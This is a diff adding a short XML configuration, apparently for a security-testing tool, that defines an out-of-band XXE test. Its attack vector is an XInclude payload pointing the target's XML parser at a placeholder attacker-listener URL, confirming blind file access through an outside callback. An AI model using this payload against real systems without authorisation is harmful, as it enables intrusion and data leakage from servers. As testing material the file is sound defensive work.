@@ -1,0 +1,16 @@
+<config>
+<name>FileAccess: Out-of-Band channels</name>
+<description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+    <externalResources>false</externalResources>
+</params>
+<attackvectors>
+<attackvector type="system" default="true">
+<directMessage><![CDATA[<?xml version='1.0'?>
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="§tf_listenURL§"></xi:include></data>]]></directMessage>
+</attackvector>
+</config>
